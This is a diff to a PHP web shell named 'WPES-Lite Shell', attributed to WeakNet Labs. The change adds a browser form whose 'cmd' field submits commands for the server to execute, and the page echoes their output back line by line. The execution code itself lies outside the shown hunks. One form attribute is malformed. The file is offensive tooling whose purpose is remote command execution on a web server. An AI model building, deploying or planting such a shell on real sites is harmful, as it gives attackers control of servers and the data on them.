@@ -1,6 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>WPES-Lite Shell</title></head>
+<head>
+<title>WPES-Lite Shell</title>
+<style>
+.cmdInput{
+ margin:10px 0 0 0;
+}
+</style>
+</head>
 <!-- 2018 WeakNet Labs, Douglas Berdeaux -->
 <body>
 <?php
@@ -13,8 +20,15 @@
    echo $lineParse."<br />";
   }
  }else{
-  echo "?cmd=^CMD^ in GET request, please.";
+  echo "Enter command to execute on server below.";
  }
 ?>
+<div class="cmdInput">
+<form action="" method=get">
+ CMD: <input type="text" name="cmd" /><br />
+ <input type="submit" value="GET Results" />
+</form>
+</div>
 </body>
 </html>
+
